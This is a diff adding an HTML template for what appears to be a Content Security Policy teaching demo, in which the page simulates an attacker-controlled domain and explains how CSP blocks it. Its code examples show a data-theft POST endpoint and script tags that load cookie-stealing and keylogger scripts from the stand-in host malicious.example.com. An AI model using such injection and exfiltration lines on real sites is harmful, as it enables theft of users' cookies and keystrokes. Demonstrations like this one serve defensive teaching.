@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title><%= title %></title>
+    <link rel="stylesheet" href="/css/styles.css">
+</head>
+<body>
+    <header>
+        <nav>
+            <h1>CSP Demo: <%= domain %></h1>
+            <a href="/" class="nav-home">← Back to Scenarios</a>
+        </nav>
+    </header>
+    
+    <main>
+        <div class="demo-content malicious-domain">
+            <div class="csp-status csp-none">
+                ⚠️ MALICIOUS DOMAIN SIMULATION - This represents an attacker-controlled site
+            </div>
+            
+            <h2>Simulated Malicious Domain</h2>
+            <p>This page simulates what an attacker-controlled domain might look like. It contains endpoints that could be used to steal data or host malicious scripts.</p>
+            
+            <div class="demo-form">
+                <h3>Data Collection Endpoint</h3>
+                <p>This endpoint receives data sent from other domains and logs it. In a real attack, this would be used to steal sensitive information.</p>
+                
+                <div class="code-example">
+POST /malicious/steal-data
+Content-Type: application/json
+
+{
+  "sensitiveData": "user input from vulnerable forms"
+}
+                </div>
+                
+                <div id="stolenData">
+                    <h4>Recently Received Data:</h4>
+                    <p><em>Data sent to this endpoint will appear here...</em></p>
+                </div>
+            </div>
+            
+            <div class="demo-form">
+                <h3>Malicious Script Hosting</h3>
+                <p>In a real scenario, this domain would host malicious JavaScript files that attackers try to inject into vulnerable sites.</p>
+                
+                <div class="code-example">
+// Example malicious script:
+&lt;script src="https://malicious.example.com/steal-cookies.js"&gt;&lt;/script&gt;
+&lt;script src="https://malicious.example.com/keylogger.js"&gt;&lt;/script&gt;
+                </div>
+            </div>
+            
+            <div class="demo-info">
+                <h3>How CSP Protects Against This Domain:</h3>
+                <ul>
+                    <li><strong>Basic CSP:</strong> Blocks cross-origin script loading from this domain</li>
+                    <li><strong>Form Action:</strong> Can block form submissions to this domain</li>
+                    <li><strong>Connect-src:</strong> Can block AJAX requests to this domain</li>
+                    <li><strong>Frame-src:</strong> Can prevent this domain from being loaded in iframes</li>
+                </ul>
+                
+                <p><strong>Warning:</strong> This is a controlled demonstration. Real malicious domains would attempt to steal credentials, install malware, or perform other harmful actions.</p>
+            </div>
+        </div>
+    </main>
+    
+    <script>
+        // Simulate periodic data collection
+        setInterval(() => {
+            const timestamp = new Date().toLocaleTimeString();
+            console.log(`[${timestamp}] Malicious domain is active and collecting data...`);
+        }, 5000);
+        
+        // Check if any data was sent via URL parameters (simulating XSS data exfiltration)
+        const urlParams = new URLSearchParams(window.location.search);
+        if (urlParams.has('stolen')) {
+            alert('Data stolen via URL parameter: ' + urlParams.get('stolen'));
+        }
+    </script>
+</body>
+</html>
